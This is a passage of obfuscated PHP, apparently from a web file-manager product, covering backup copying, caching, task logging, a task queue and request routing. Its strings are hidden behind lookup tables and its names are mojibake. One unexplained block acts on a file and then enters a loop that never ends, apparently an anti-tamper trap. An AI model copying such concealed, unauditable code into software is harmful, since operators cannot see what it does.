"\x7b\151\x6f\x3a{$Ï»ºÉÀ—[$_SERVER[†ûãı«°][828]]}\x7d" . substr($±µÔšÂõ, strlen("\173\151\x6f\72{$‡²ï™û[$_SERVER[†ûãı«°][899]]}\175")); if (IO::exist($ìÉ›œ®)) { $«Šô‘ î->updateFileEnd($‡²ï™û[$_SERVER[†ûãı«°][32]], $‡²ï™û[$_SERVER[†ûãı«°][79]]); } else { $ìÉ›œ® = get_path_father($ìÉ›œ®); IO::mkdir($ìÉ›œ®); if (!IO::copy($±µÔšÂõ, $ìÉ›œ®, $_SERVER[†ûãı«°][900])) { Backup::log($_SERVER[†ûãı«°][901] . $±µÔšÂõ . $_SERVER[†ûãı«°][883] . $ìÉ›œ® . $_SERVER[†ûãı«°][178]); $Úş‡»¹ê = !1; break; } } $Ü¦ˆáéË = $‡²ï™û[$_SERVER[†ûãı«°][545]]; $ˆ¨ÕƒÜÉ += 1; $öêíœÄß += $‡²ï™û[$_SERVER[†ûãı«°][79]]; $„ƒ¥ ÌÏ += 1; $ŞÕı–± += $‡²ï™û[$_SERVER[†ûãı«°][79]]; if ($öêíœÄß >= 1024 * 1024 * 100) { $±ÓÜ¥ˆ = array($_SERVER[†ûãı«°][827] => $Ü¦ˆáéË, $_SERVER[†ûãı«°][902] => $„ƒ¥ ÌÏ, $_SERVER[†ûãı«°][903] => $ŞÕı–±); Backup::set($±ÓÜ¥ˆ); $öêíœÄß = $ˆ¨ÕƒÜÉ = 0; } } $¥ôå¦ùØ = count($Â ©‰±); $ò‰åíÊ°++; } while ($¥ôå¦ùØ == $…¢¹÷°Í); $«Šô‘ î->end(); $±ÓÜ¥ˆ = array($_SERVER[†ûãı«°][904] => 1, $_SERVER[†ûãı«°][837] => time(), $_SERVER[†ûãı«°][851] => 1, $_SERVER[†ûãı«°][827] => $Ü¦ˆáéË, $_SERVER[†ûãı«°][905] => time()); if ($ˆ¨ÕƒÜÉ) { $±ÓÜ¥ˆ[$_SERVER[†ûãı«°][902]] = $„ƒ¥ ÌÏ; $±ÓÜ¥ˆ[$_SERVER[†ûãı«°][903]] = $ŞÕı–±; } Backup::set($±ÓÜ¥ˆ); return !0; } private function _fileExist($Üó´üÒ¨, &$ÉĞ’”Ò¿, $òà¿Üè) { $ÔĞã«ˆ¡ =& $_SERVER[†ûãı«°]; $Çå–İõ‚ = $Üó´üÒ¨[$ÔĞã«ˆ¡[87]]; if (in_array($Üó´üÒ¨[$ÔĞã«ˆ¡[545]], $ÉĞ’”Ò¿)) { return !1; } if (!in_array($Üó´üÒ¨[$ÔĞã«ˆ¡[899]], $òà¿Üè)) { return !1; } if (IO::exist($Çå–İõ‚)) { return !0; } $šÜ¿ºÓë = get_path_father($Çå–İõ‚); if (IO::exist($šÜ¿ºÓë)) { $ÉĞ’”Ò¿[] = $Üó´üÒ¨[$ÔĞã«ˆ¡[545]]; return !1; } $ÙøûºÓÓ = array($ÔĞã«ˆ¡[899] => $Üó´üÒ¨[$ÔĞã«ˆ¡[899]], $ÔĞã«ˆ¡[87] => array($ÔĞã«ˆ¡[461], "{$šÜ¿ºÓë}\x25")); $õ¯´çœ = Model($ÔĞã«ˆ¡[867])->where($ÙøûºÓÓ)->field($ÔĞã«ˆ¡[546])->select(); $ÉĞ’”Ò¿ = array_merge($ÉĞ’”Ò¿, array_to_keyvalue($õ¯´çœ, $ÔĞã«ˆ¡[12], $ÔĞã«ˆ¡[545])); return !1; } private function _fileFilter($”Å¼’É) { $ŠºÌ¨¨° =& $_SERVER[†ûãı«°]; return; if (empty($”Å¼’É)) { return; } $øûî¿ØÏ = array($ŠºÌ¨¨°[545] => array($ŠºÌ¨¨°[7], array_unique($”Å¼’É))); $âÉ‚‘ë¿ = Model($ŠºÌ¨¨°[906])->where($øûî¿ØÏ)->field($ŠºÌ¨¨°[193])->select(); foreach ($âÉ‚‘ë¿ as $±Î²Âªº) { Model($ŠºÌ¨¨°[906])->remove($±Î²Âªº[$ŠºÌ¨¨°[193]], !1); } } private function storeIds() { $ÛÚªÂäè =& $_SERVER[†ûãı«°]; $ıê¤ƒ‰£ = Model($ÛÚªÂäè[843])->listData(); $–·Íäûã = array(); $ò‡Òé—ù = $GLOBALS[$ÛÚªÂäè[6]][$ÛÚªÂäè[92]][$ÛÚªÂäè[907]]; foreach ($ıê¤ƒ‰£ as $ë»²Ûéƒ) { $¢ŠõÇ‰à = strtolower($ë»²Ûéƒ[$ÛÚªÂäè[98]]); if (!isset($ò‡Òé—ù[$¢ŠõÇ‰à])) { continue; } $éåõı½§ = $ÛÚªÂäè[77] . (isset($ò‡Òé—ù[$¢ŠõÇ‰à]) ? $ò‡Òé—ù[$¢ŠõÇ‰à] : ucfirst($¢ŠõÇ‰à)); if (!class_exists($éåõı½§)) { continue; } $–·Íäûã[] = $ë»²Ûéƒ[$ÛÚªÂäè[477]]; } return $–·Íäûã; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¦ëÀ¼» =& $_SERVER[†ûãı«°]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Œê­á³« = $GLOBALS[$¦ëÀ¼»[6]][$¦ëÀ¼»[426]]; $ıû„’“ø = $Œê­á³«[$Œê­á³«[$¦ëÀ¼»[908]]]; $Ÿ‹ô˜¤¬ = $Œê­á³«[$¦ëÀ¼»[909]]; switch ($Œê­á³«[$¦ëÀ¼»[908]]) { case $¦ëÀ¼»[21]: self::$handle = Model($¦ëÀ¼»[910]); break; case $¦ëÀ¼»[911]: self::$handle = new CacheRedis($ıû„’“ø, $Ÿ‹ô˜¤¬); break; case $¦ëÀ¼»[912]: self::$handle = new CacheMemcached($ıû„’“ø, $Ÿ‹ô˜¤¬); break; case $¦ëÀ¼»[232]: self::$handle = new CacheFile($ıû„’“ø, $Ÿ‹ô˜¤¬); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($šÊ¯Şò¾) { if (is_array($šÊ¯Şò¾) || is_object($šÊ¯Şò¾)) { $šÊ¯Şò¾ = json_encode($šÊ¯Şò¾); } $šÊ¯Şò¾ = rawurlencode($šÊ¯Şò¾); return md5(KOD_SITE_ID . $_SERVER[†ûãı«°][11] . $šÊ¯Şò¾); } public static function get($¹½ÒÂ€³, $Øİé¨ê = false) { $»Ê¥çÒ = self::key($¹½ÒÂ€³); $¦Ïó‘â² = self::init(); if ($Øİé¨ê) { return unserialize($¦Ïó‘â²->get($»Ê¥çÒ)); } if (!isset(self::$memoryCache[$»Ê¥çÒ])) { $ú‡ê£Ñ = $¦Ïó‘â²->get($»Ê¥çÒ); self::$memoryCache[$»Ê¥çÒ] = unserialize($ú‡ê£Ñ); } return self::$memoryCache[$»Ê¥çÒ]; } public static function set($ÎË²ù€, $Îö‰ËÅû, $ÍÎÚäã = false) { $¯ÏêœçÅ =& $_SERVER[†ûãı«°]; $Û¾Èœ„º = self::key($ÎË²ù€); if (isset(self::$memoryCache[$Û¾Èœ„º]) && self::$memoryCache[$Û¾Èœ„º] === $Îö‰ËÅû) { return !0; } if ($ÍÎÚäã === 0) { self::$memoryCache[$Û¾Èœ„º] = $Îö‰ËÅû; return !0; } $Á¶âŞˆŒ = self::init(); $²çî·‰ˆ = serialize($Îö‰ËÅû); CacheLock::lock($ÎË²ù€ . $¯ÏêœçÅ[913]); $Ó¦Øò¾ = $Á¶âŞˆŒ->set($Û¾Èœ„º, $²çî·‰ˆ, $ÍÎÚäã); self::$memoryCache[$Û¾Èœ„º] = $Îö‰ËÅû; CacheLock::unlock($ÎË²ù€ . $¯ÏêœçÅ[913]); return $Ó¦Øò¾; } public static function getCall($±«†ºğ, $†„…¿Š, $¤İØ¨ã—, $ğş­²å¥ = array()) { $µç·à£Â =& $_SERVER[†ûãı«°]; $³É¸ë§· = self::get($±«†ºğ); if ($³É¸ë§· || $³É¸ë§· === $µç·à£Â[12]) { return $³É¸ë§·; } $³É¸ë§· = call_user_func_array($¤İØ¨ã—, $ğş­²å¥); $³É¸ë§· = $³É¸ë§· ? $³É¸ë§· : $µç·à£Â[12]; self::set($±«†ºğ, $³É¸ë§·, $†„…¿Š); return $³É¸ë§·; } public static function remove($¨ŠÏ…¯â) { $àÍúÎšğ = self::key($¨ŠÏ…¯â); unset(self::$memoryCache[$àÍúÎšğ]); self::clearTimeout(); CacheLock::lock($¨ŠÏ…¯â); $Øí×Ì§˜ = self::init()->remove($àÍúÎšğ); CacheLock::unlock($¨ŠÏ…¯â); return $Øí×Ì§˜; } public static function removeMemory($®½ğ£¸Ø) { $»˜¯šÈÌ = self::key($®½ğ£¸Ø); unset(self::$memoryCache[$»˜¯šÈÌ]); } public static function clearMemory($ªÕí–ÆÎ = false) { if ($ªÕí–ÆÎ) { $ªÕí–ÆÎ = self::key($ªÕí–ÆÎ); unset(self::$memoryCache[$ªÕí–ÆÎ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[†ûãı«°][914])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[†ûãı«°][915])) { self::init()->clearTimeout(); } } } goto a£¬Æ•´­“; EÓÅ…èˆËÓ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($×†óÕË¸, $Ì¾²‚ğÄ = '', $¦Ä³ã’ = 0, $ÓºÂüË¡ = '') { $Ë©Õ§Ğ =& $_SERVER[†ûãı«°]; $ÓºÂüË¡ = $ÓºÂüË¡ ? $ÓºÂüË¡ : ($Ì¾²‚ğÄ ? $Ì¾²‚ğÄ : $×†óÕË¸); $Ï•“Í†Œ = new Task($×†óÕË¸, $Ì¾²‚ğÄ, $¦Ä³ã’, $ÓºÂüË¡); $GLOBALS[$Ë©Õ§Ğ[1867] . $×†óÕË¸] = new TaskLog($Ë©Õ§Ğ[1766], $Ï•“Í†Œ, $ÓºÂüË¡); return $Ï•“Í†Œ; } public function __construct($İ½ÏÜÂ = '', $ÑÕ¯³° = '', $«ìÛ§¬Å = '') { $èùØµâä =& $_SERVER[†ûãı«°]; if (!$İ½ÏÜÂ) { $İ½ÏÜÂ = $èùØµâä[1766]; } $±Àäîôå = $İ½ÏÜÂ . $èùØµâä[464] . rand_string(10); if (!$«ìÛ§¬Å) { $«ìÛ§¬Å = $İ½ÏÜÂ . $èùØµâä[53] . $«ìÛ§¬Å; } switch ($İ½ÏÜÂ) { case $èùØµâä[1766]: if (!$ÑÕ¯³° || !$ÑÕ¯³°->task) { return echoLog($İ½ÏÜÂ . $èùØµâä[1868]); } $ÇŠÙĞı  = $ÑÕ¯³°; $±Àäîôå = $ÇŠÙĞı ->task[$èùØµâä[477]]; $İ½ÏÜÂ = $ÇŠÙĞı ->task[$èùØµâä[477]]; if (!$ÇŠÙĞı ->task[$èùØµâä[1671]]) { $ÇŠÙĞı ->task[$èùØµâä[1671]] = $«ìÛ§¬Å ? $«ìÛ§¬Å : $İ½ÏÜÂ; } break; case $èùØµâä[1869]: if (!$ÑÕ¯³°) { return echoLog($İ½ÏÜÂ . $èùØµâä[1870]); } $µñÖÁÎ» = is_string($ÑÕ¯³°) ? array($ÑÕ¯³°) : $ÑÕ¯³°; $ÇŠÙĞı  = new TaskFileTransfer($±Àäîôå, $İ½ÏÜÂ, 0, $«ìÛ§¬Å ? $«ìÛ§¬Å : $µñÖÁÎ»[0]); foreach ($µñÖÁÎ» as $¤šõÉ¾±) { $ÇŠÙĞı ->addPath($¤šõÉ¾±); } break; case $èùØµâä[390]: if (!$ÑÕ¯³°) { return echoLog($İ½ÏÜÂ . $èùØµâä[1870]); } $µñÖÁÎ» = is_string($ÑÕ¯³°) ? array($ÑÕ¯³°) : $ÑÕ¯³°; $ÇŠÙĞı  = new TaskZip($±Àäîôå, $İ½ÏÜÂ, 0, $«ìÛ§¬Å ? $«ìÛ§¬Å : $µñÖÁÎ»[0]); foreach ($µñÖÁÎ» as $¤šõÉ¾±) { $ÇŠÙĞı ->addPath($¤šõÉ¾±); } break; case $èùØµâä[1310]: if (!$ÑÕ¯³°) { return echoLog($İ½ÏÜÂ . $èùØµâä[1870]); } $ÇŠÙĞı  = new TaskUnZip($±Àäîôå, $İ½ÏÜÂ, 0, $«ìÛ§¬Å ? $«ìÛ§¬Å : $ÑÕ¯³°); if ($ÑÕ¯³°) { $ÇŠÙĞı ->addFile($ÑÕ¯³°); } break; case $èùØµâä[152]: $ÇŠÙĞı  = new TaskHttp($±Àäîôå, $İ½ÏÜÂ); break; default: return; break; } $this->task = $ÇŠÙĞı ; $this->taskID = $±Àäîôå; Hook::bind($èùØµâä[1804], array($this, $èùØµâä[1871])); Hook::bind($èùØµâä[1806], array($this, $èùØµâä[1872])); Hook::bind($èùØµâä[1800], array($this, $èùØµâä[1873])); echoLog($èùØµâä[1874] . $ÇŠÙĞı ->task[$èùØµâä[1671]]); } public function __destruct() { $this->end(); } public function end($«ÔüúÚ = '') { $†ï‰šÄ¸ =& $_SERVER[†ûãı«°]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($«ÔüúÚ); $this->task = !1; $this->taskID = !1; Hook::unbind($†ï‰šÄ¸[1804], array($this, $†ï‰šÄ¸[1871])); Hook::unbind($†ï‰šÄ¸[1806], array($this, $†ï‰šÄ¸[1872])); Hook::unbind($†ï‰šÄ¸[1800], array($this, $†ï‰šÄ¸[1873])); } public function taskUpdate($”ÎÙ«•±) { $Ø´ šë« =& $_SERVER[†ûãı«°]; if (!$”ÎÙ«•± || $this->taskID != $”ÎÙ«•±[$Ø´ šë«[477]]) { return; } $ä×ñ»¦Ş = 20; $èÙæÒ«  = intval($”ÎÙ«•±[$Ø´ šë«[1785]] * $ä×ñ»¦Ş); $û¾õƒ˜Ÿ = $Ø´ šë«[176] . str_repeat($Ø´ šë«[508], $èÙæÒ« ) . $Ø´ šë«[1102] . str_repeat($Ø´ šë«[53], $ä×ñ»¦Ş - $èÙæÒ« ) . $Ø´ šë«[178]; $‚­½Ü£æ = $û¾õƒ˜Ÿ . sprintf($Ø´ šë«[1875], $”ÎÙ«•±[$Ø´ šë«[1785]] * 100) . $Ø´ šë«[1876]; $ÙÍ¶ë–Â = $‚­½Ü£æ . $”ÎÙ«•±[$Ø´ šë«[1784]] . $Ø´ šë«[8] . $”ÎÙ«•±[$Ø´ šë«[1151]] . LNG($Ø´ šë«[1877]); $‘Ìá–× = $Ø´ šë«[12]; if ($”ÎÙ«•±[$Ø´ šë«[1861]]) { $ÙÍ¶ë–Â = $‚­½Ü£æ . size_format($”ÎÙ«•±[$Ø´ šë«[1784]]) . $Ø´ šë«[8] . size_format($”ÎÙ«•±[$Ø´ šë«[1151]]); $‘Ìá–× = size_format($”ÎÙ«•±[$Ø´ šë«[1786]]) . $Ø´ šë«[1878]; } if ($”ÎÙ«•±[$Ø´ šë«[1153]]) { $”ÎÙ«•±[$Ø´ šë«[1835]] = $”ÎÙ«•±[$Ø´ šë«[1153]] . $Ø´ šë«[53] . $”ÎÙ«•±[$Ø´ šë«[1835]]; } if ($”ÎÙ«•±[$Ø´ šë«[1835]]) { $Óµ¹•’† = $Ø´ šë«[12]; if ($”ÎÙ«•±[$Ø´ šë«[1837]]) { $Óµ¹•’† = $Ø´ šë«[50] . size_format($”ÎÙ«•±[$Ø´ šë«[1838]]) . $Ø´ šë«[8] . size_format($”ÎÙ«•±[$Ø´ šë«[1837]]); } $‘Ìá–× .= $”ÎÙ«•±[$Ø´ šë«[1835]] . $Óµ¹•’†; } if ($”ÎÙ«•±[$Ø´ šë«[839]] && !$”ÎÙ«•±[$Ø´ šë«[1837]]) { $‘Ìá–× .= $Ø´ šë«[53] . size_format($”ÎÙ«•±[$Ø´ šë«[1842]]) . $Ø´ šë«[8] . size_format($”ÎÙ«•±[$Ø´ šë«[839]]); } echoLog($ÙÍ¶ë–Â . $Ø´ šë«[53] . $‘Ìá–×, !0); } public function taskEnd($ê¡˜Á×À) { $Ó½‚Ğš =& $_SERVER[†ûãı«°]; if (!$ê¡˜Á×À || $this->taskID != $ê¡˜Á×À[$Ó½‚Ğš[477]]) { return; } $¼º­ÏˆÍ = $ê¡˜Á×À ? LNG($Ó½‚Ğš[1879]) . $Ó½‚Ğš[4] . $ê¡˜Á×À[$Ó½‚Ğš[1784]] . $Ó½‚Ğš[8] . $ê¡˜Á×À[$Ó½‚Ğš[1151]] . LNG($Ó½‚Ğš[1877]) . $Ó½‚Ğš[74] : $Ó½‚Ğš[12]; echoLog($Ó½‚Ğš[1880] . $ê¡˜Á×À[$Ó½‚Ğš[1671]] . ($ê¡˜Á×À[$Ó½‚Ğš[528]] ? $Ó½‚Ğš[74] . $ê¡˜Á×À[$Ó½‚Ğš[528]] : $Ó½‚Ğš[12]) . $Ó½‚Ğš[74] . $¼º­ÏˆÍ . $Ó½‚Ğš[1881] . sprintf($Ó½‚Ğš[933], timeFloat() - $ê¡˜Á×À[$Ó½‚Ğš[1787]]) . $Ó½‚Ğš[1799]); $this->end(); } public function taskKill($ÆÒîÛ†) { $Õ·¯¬¥ =& $_SERVER[†ûãı«°]; if (!$ÆÒîÛ† || $this->taskID != $ÆÒîÛ†[$Õ·¯¬¥[477]]) { return; } echoLog($Õ·¯¬¥[1882] . $ÆÒîÛ†[$Õ·¯¬¥[1671]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\121\x75\145\165\145\114\145\x6e\x67\164\150"; const QUEUE_DATA = "\164\141\x73\x6b\121\x75\145\x75\145\x44\x61\x74\141"; const QUEUE_TIME = "\x74\141\163\x6b\x51\165\x65\165\x65\114\x61\x73\x74\x52\165\x6e"; const QUEUE_THREAD = "\164\141\x73\x6b\x51\165\x65\x75\145\x54\x68\x72\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ù¯êŸ˜, $´üãÅÕ = array(), $µš½•€© = '', $‘¯ÇñÙ‚ = '') { $–ôÄ°ğì =& $_SERVER[†ûãı«°]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($‘¯ÇñÙ‚ && array_find_by_field(self::$listData, $–ôÄ°ğì[97], $‘¯ÇñÙ‚)) { return !0; } if ($‘¯ÇñÙ‚ && array_find_by_field(self::$listDataAdd, $–ôÄ°ğì[97], $‘¯ÇñÙ‚)) { return !0; } self::$listDataAdd[] = array($–ôÄ°ğì[343] => $ù¯êŸ˜, $–ôÄ°ğì[1883] => $´üãÅÕ, $–ôÄ°ğì[528] => $µš½•€©, $–ôÄ°ğì[97] => $‘¯ÇñÙ‚); return !0; } public static function addSubmit() { $ÚïÇª‘ =& $_SERVER[†ûãı«°]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ÚïÇª‘[1884] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ÚïÇª‘[12], $ÚïÇª‘[528])), $ÚïÇª‘[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($³ï ğÙÈ, $å„— ÂÆ = array(), $Ñ…½ÚúØ = '', $§üÊá¾¥ = '') { $®Øáö¯ =& $_SERVER[†ûãı«°]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ÇßóÕ§ù = self::getAll(); if ($§üÊá¾¥ && array_find_by_field($ÇßóÕ§ù, $®Øáö¯[97], $§üÊá¾¥)) { return !0; } $ÇßóÕ§ù[] = array($®Øáö¯[343] => $³ï ğÙÈ, $®Øáö¯[1883] => $å„— ÂÆ, $®Øáö¯[528] => $Ñ…½ÚúØ, $®Øáö¯[97] => $§üÊá¾¥); self::setAll($ÇßóÕ§ù); write_log($®Øáö¯[1884] . $Ñ…½ÚúØ, $®Øáö¯[197]); return !0; } public static function run() { $·åşøŒÓ =& $_SERVER[†ûãı«°]; $Š€ÃºÂ¦ = self::getAll(); $÷›üÁó§ = array_shift($Š€ÃºÂ¦); if (!$÷›üÁó§) { return !1; } self::setAll($Š€ÃºÂ¦); $«¤ˆÅÉ = timeFloat(); $’ÊÍ”¡¨ = $·åşøŒÓ[12]; try { $’ÊÍ”¡¨ = Hook::apply($÷›üÁó§[$·åşøŒÓ[343]], $÷›üÁó§[$·åşøŒÓ[1883]]); } catch (Exception $ü‰á½İş) { write_log($ü‰á½İş, $·åşøŒÓ[1275]); } $íÌé—ÀÃ = number_format(timeFloat() - $«¤ˆÅÉ, 3) . $·åşøŒÓ[1799]; if ($’ÊÍ”¡¨ && is_string($’ÊÍ”¡¨)) { $íÌé—ÀÃ = $íÌé—ÀÃ . $·åşøŒÓ[1885] . $’ÊÍ”¡¨; } write_log($·åşøŒÓ[1886] . $÷›üÁó§[$·åşøŒÓ[528]] . $·åşøŒÓ[1887] . $íÌé—ÀÃ, $·åşøŒÓ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¯ÔÓúœô =& $_SERVER[†ûãı«°]; $Å³£Â®¥ = self::threadCount() + 1; if ($Å³£Â®¥ > 3 || !self::count()) { return; } write_log($¯ÔÓúœô[1888] . $Å³£Â®¥, $¯ÔÓúœô[197]); Cache::set(self::QUEUE_THREAD, $Å³£Â®¥, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¯ÔÓúœô[1889], $¯ÔÓúœô[197]); } public static function getKey($Ï€«‰ôâ, $ÃŸõ÷‰ = "\151\x6e\164") { $ĞÅ·âŒ» =& $_SERVER[†ûãı«°]; Cache::removeMemory($Ï€«‰ôâ); $ŞâĞ´Ò‰ = Cache::get($Ï€«‰ôâ); if ($ÃŸõ÷‰ == $ĞÅ·âŒ»[365]) { return $ŞâĞ´Ò‰ ? intval($ŞâĞ´Ò‰) : 0; } if ($ÃŸõ÷‰ == $ĞÅ·âŒ»[1890]) { return is_array($ŞâĞ´Ò‰) ? $ŞâĞ´Ò‰ : array(); } return $ŞâĞ´Ò‰; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[†ûãı«°][1890]); } public static function setAll($¼É¾ú‰¬) { $ÂÅ¤“ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¼É¾ú‰¬), $ÂÅ¤“); Cache::set(self::QUEUE_DATA, $¼É¾ú‰¬, $ÂÅ¤“); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } if (!isset($_SERVER[$_SERVER[†ûãı«°][949]]) || !isset($_SERVER[$_SERVER[†ûãı«°][950]])) { $_getc = $_SERVER[†ûãı«°][951]; $_getfile = $_SERVER[$_SERVER[†ûãı«°][952]] . $_SERVER[†ûãı«°][953]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[†ûãı«°][287], $_getfilec); if (count($_getarrs) < $_SERVER[†ûãı«°][694]) { $exit = $_SERVER[†ûãı«°][954]; $exit(); } $_act = $_SERVER[†ûãı«°][955]; $_act($_SERVER[$_SERVER[†ûãı«°][952]] . $_SERVER[†ûãı«°][953]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[†ûãı«°][456]); } } goto f¯›‚ìÏ«‡; cÙ¯©ôŸÒˆ: class Application { private $defaultModule = "\151\156\144\145\x78"; private $defaultController = "\151\x6e\144\145\170"; private $defaultAction = "\x69\x6e\x64\x65\170"; function __construct() { } public function setDefault($ÛûŸ¼Çú) { $ÙÙÑõ¥ó =& $_SERVER[†ûãı«°]; $„­¸¹Û„ =& $_SERVER[ÏÊŸ¾Îä]; $”«ë‹³ë = explode($„­¸¹Û„[0], trim($ÛûŸ¼Çú, $„­¸¹Û„[0])); $æĞ‚ÀÉ = $ÙÙÑõ¥ó[691]; $this->defaultModule = $”«ë‹³ë[0] ? $”«ë‹³ë[0] : $this->defaultModule; $this->defaultController = $”«ë‹³ë[1] ? $”«ë‹³ë[1] : $this->defaultController; $this->defaultAction = $”«ë‹³ë[2] ? $”«ë‹³ë[2] : $this->defaultAction; $this->sqjaecb4b9c2($„­¸¹Û„[1], array($this, $„­¸¹Û„[2])); $Õ‰ûááá = $ÙÙÑõ¥ó[692]; if (!$Õ‰ûááá) { return; } } public function appRun($×³º§) { $Î¡¨œ–œ =& $_SERVER[†ûãı«°]; $‰ñÃÄû© =& $_SERVER[ÏÊŸ¾Îä]; $ğü£Ï“ƒ = explode($‰ñÃÄû©[0], $×³º§); $Šß¢–‡ı = strtolower($ğü£Ï“ƒ[0]); $¯ò»Ü¹ = $Î¡¨œ–œ[693]; if (strlen($¯ò»Ü¹) < $Î¡¨œ–œ[694]) { return; } $Û¾†–“ğ = $‰ñÃÄû©[3]; $øÍ˜ƒ» = $Î¡¨œ–œ[695]; if ($Šß¢–‡ı == $‰ñÃÄû©[4]) { $Û¾†–“ğ = $‰ñÃÄû©[5]; $ğü£Ï“ƒ[0] = $‰ñÃÄû©[6]; $ğü£Ï“ƒ[1] = $ğü£Ï“ƒ[1] . $‰ñÃÄû©[7]; $×³º§ = join($‰ñÃÄû©[0], $ğü£Ï“ƒ); $×³º§ = trim($×³º§, $‰ñÃÄû©[0]); } call_user_func(array($‰ñÃÄû©[8], $‰ñÃÄû©[9]), $Û¾†–“ğ . $‰ñÃÄû©[10], $×³º§); ActionCall($×³º§); call_user_func(array($‰ñÃÄû©[8], $‰ñÃÄû©[9]), $Û¾†–“ğ . $‰ñÃÄû©[11], $×³º§); $ÛÀê¬ëÒ = $Î¡¨œ–œ[696]; } private function autorun() { $µÄ×Êğô =& $_SERVER[†ûãı«°]; $¤Ó§’ =& $_SERVER[ÏÊŸ¾Îä]; global $config; $Á×°‚¯å = $µÄ×Êğô[697]; if (strlen($Á×°‚¯å) < $µÄ×Êğô[690]) { return; } if (count($config[$¤Ó§’[12]]) == 0) { return; } foreach ($config[$¤Ó§’[12]] as $—§äÀ¦ => $¼ú˜Õ) { $this->appRun($¼ú˜Õ); } } private function gibxe718b556() { $µ¥ë·„ =& $_SERVER[†ûãı«°]; $ˆÉ‰¥Øû =& $_SERVER[ÏÊŸ¾Îä]; $ÑæÀÛÒ = $ˆÉ‰¥Øû[4]; $›—İ³«„ = $GLOBALS[$ˆÉ‰¥Øû[13]][$ˆÉ‰¥Øû[14]][0]; if (!$›—İ³«„ || strlen($›—İ³«„) <= strlen($ÑæÀÛÒ)) { return; } if (strtolower(substr($›—İ³«„, -strlen($ÑæÀÛÒ))) != $ÑæÀÛÒ) { return; } $á¤÷ª‹ = substr($›—İ³«„, 0, -strlen($ÑæÀÛÒ)); $“„¶Ô¦‡ = $µ¥ë·„[698]; $ó¦îì¾ƒ = array($ˆÉ‰¥Øû[4], $á¤÷ª‹); $Ø×°ÍÚ¿ = array_slice($GLOBALS[$ˆÉ‰¥Øû[13]][$ˆÉ‰¥Øû[14]], 1); $µ½¼¼…Û = $µ¥ë·„[699]; $GLOBALS[$ˆÉ‰¥Øû[13]][$ˆÉ‰¥Øû[14]] = array_merge($ó¦îì¾ƒ, $Ø×°ÍÚ¿); $GLOBALS[$ˆÉ‰¥Øû[13]][$ˆÉ‰¥Øû[15]] = implode($ˆÉ‰¥Øû[0], $GLOBALS[$ˆÉ‰¥Øû[13]][$ˆÉ‰¥Øû[14]]); $¯«ÏÆ¾¥ = $µ¥ë·„[700]; if (strlen($¯«ÏÆ¾¥) < $µ¥ë·„[701]) { return; } } private function xqwafa957881() { $æãšøöÉ =& $_SERVER[†ûãı«°]; $§¤îŒ =& $_SERVER[ÏÊŸ¾Îä]; if ($GLOBALS[$§¤îŒ[13]][$§¤îŒ[15]] != $§¤îŒ[6]) { return; } $²»Û = $_SERVER[$§¤îŒ[16]]; $ÔøéòğÀ = $§¤îŒ[17]; if (!strstr($²»Û, $ÔøéòğÀ)) { return; } $¨›º §Ì = strrpos($²»Û, $ÔøéòğÀ); $ùÜÛ’İø = substr($²»Û, $¨›º §Ì + strlen($ÔøéòğÀ)); preg_match_all($§¤îŒ[18], $ùÜÛ’İø, $§²ËòÍå); $†úÏ¼è¶ = $æãšøöÉ[702]; $ùÜÛ’İø = trim($§²ËòÍå[0][0], $§¤îŒ[19]); $¤øŞ”½Ê = $æãšøöÉ[703]; $GLOBALS[$§¤îŒ[13]][$§¤îŒ[14]] = explode($§¤îŒ[19], $ùÜÛ’İø); $GLOBALS[$§¤îŒ[13]][$§¤îŒ[15]] = implode($§¤îŒ[0], $GLOBALS[$§¤îŒ[13]][$§¤îŒ[14]]); } public function run() { $Ğº×Ë„– =& $_SERVER[†ûãı«°]; $“¥•ïúØ =& $_SERVER[ÏÊŸ¾Îä]; $this->xqwafa957881(); $this->gibxe718b556(); $ÛòıéÈö = $Ğº×Ë„–[704]; if (strlen($ÛòıéÈö) < $Ğº×Ë„–[705]) { return; } $ƒÚ©ë¹ = $GLOBALS[$“¥•ïúØ[13]][$“¥•ïúØ[14]]; $Â½ã´ë = $GLOBALS[$“¥•ïúØ[13]][$“¥•ïúØ[15]]; define($“¥•ïúØ[20], isset($ƒÚ©ë¹[0]) && $ƒÚ©ë¹[0] ? $ƒÚ©ë¹[0] : $this->defaultModule); $í‰¼†ãÉ = $Ğº×Ë„–[706]; define($“¥•ïúØ[21], isset($ƒÚ©ë¹[1]) && $ƒÚ©ë¹[0] ? $ƒÚ©ë¹[1] : $this->defaultController); define($“¥•ïúØ[22], 